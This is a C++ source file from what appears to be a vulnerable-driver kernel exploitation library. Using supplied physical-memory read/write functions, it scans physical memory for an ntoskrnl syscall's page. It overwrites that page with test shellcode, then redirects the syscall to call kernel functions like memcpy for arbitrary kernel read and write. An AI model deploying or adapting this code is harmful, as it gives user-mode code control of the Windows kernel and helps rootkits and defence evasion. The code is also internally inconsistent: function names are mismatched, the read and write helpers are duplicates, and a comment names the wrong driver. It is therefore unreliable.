#include "vdm_ctx.hpp"

namespace vdm
{
	// namespace-scoped function pointers that replace the class members
	read_phys_t phys_read = nullptr;
	write_phys_t phys_write = nullptr;

	// forward declarations for internal helpers (implementation-only)
	namespace {
		void locate_syscall(std::uintptr_t begin, std::uintptr_t end);
		bool valid_syscall(void* syscall_addr);
	}

	void init(read_phys_t& read_func, write_phys_t& write_func)
	{
		phys_read = read_func;
		phys_write = write_func;

		std::printf("vdm_ctx init() now finding syscall\n");

		// already found the syscall's physical page...
		if (vdm::syscall_address.load())
			return;

		std::printf("syscall not found yet\n");

		vdm::ntoskrnl = reinterpret_cast<std::uint8_t*>(
			LoadLibraryExA("ntoskrnl.exe", NULL,
				DONT_RESOLVE_DLL_REFERENCES));

		std::printf("ntoskrnl loaded into process\n");

		nt_rva = reinterpret_cast<std::uint32_t>(
			util::get_kmodule_export(
				"ntoskrnl.exe",
				syscall_hook.first,
				true
			));

		std::printf("found syscall export address\n");

		vdm::nt_page_offset = nt_rva % PAGE_4KB;
		// for each physical memory range, make a thread to search it
		std::vector<std::thread> search_threads;
		for (auto ranges : util::pmem_ranges)
			search_threads.emplace_back(std::thread(
				locate_syscall,
				ranges.first,
				ranges.second
			));

		std::printf("now searching for syscall thread\n");

		for (std::thread& search_thread : search_threads)
			search_thread.join();

		std::printf("end of vdm setup\n");
	}

	void set_read(read_phys_t& read_func)
	{
		phys_read = read_func;
	}

	void set_write(write_phys_t& write_func)
	{
		phys_write = write_func;
	}

	void rkm(void* dst, void* src, std::size_t size)
	{
		static const auto ntoskrnl_memcpy =
			util::get_kmodule_export("ntoskrnl.exe", "memcpy");

		syscall<decltype(&memcpy)>(
			ntoskrnl_memcpy, dst, src, size);
	}

	void wkm(void* dst, void* src, std::size_t size)
	{
		static const auto ntoskrnl_memcpy =
			util::get_kmodule_export("ntoskrnl.exe", "memcpy");

		syscall<decltype(&memcpy)>(
			ntoskrnl_memcpy, dst, src, size);
	}

	namespace {
		void locate_syscall(std::uintptr_t address, std::uintptr_t length)
		{
			const auto page_data =
				reinterpret_cast<std::uint8_t*>(
					VirtualAlloc(
						nullptr,
						PAGE_4KB, MEM_COMMIT | MEM_RESERVE,
						PAGE_READWRITE
					));

			for (auto page = 0u; page < length; page += PAGE_4KB)
			{
				if (vdm::syscall_address.load())
					break;

				if (!read_phys(reinterpret_cast<void*>(address + page), page_data, PAGE_4KB))
					continue;

				// check the first 32 bytes of the syscall, if its the same, test that its the correct
				// occurrence of these bytes (since dxgkrnl is loaded into physical memory at least 2 times now)...
				if (!memcmp(page_data + nt_page_offset, ntoskrnl + nt_rva, 32))
					if (valid_syscall(reinterpret_cast<void*>(address + page + nt_page_offset)))
						syscall_address.store(
							reinterpret_cast<void*>(
								address + page + nt_page_offset));
			}
			VirtualFree(page_data, PAGE_4KB, MEM_DECOMMIT);
		}

		bool valid_syscall(void* syscall_addr)
		{
			static std::mutex syscall_mutex;
			syscall_mutex.lock();

			static const auto proc =
				GetProcAddress(
					LoadLibraryA(syscall_hook.second),
					syscall_hook.first
				);

			// 0:  48 31 c0    xor rax, rax
			// 3 : c3          ret
			std::uint8_t shellcode[] = { 0x48, 0x31, 0xC0, 0xC3 };
			std::uint8_t orig_bytes[sizeof shellcode];

			// save original bytes and install shellcode...
			read_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
			write_phys(syscall_addr, shellcode, sizeof shellcode);

			auto result = reinterpret_cast<NTSTATUS(__fastcall*)(void)>(proc)();
			write_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
			syscall_mutex.unlock();
			return result == STATUS_SUCCESS;
		}
	}
}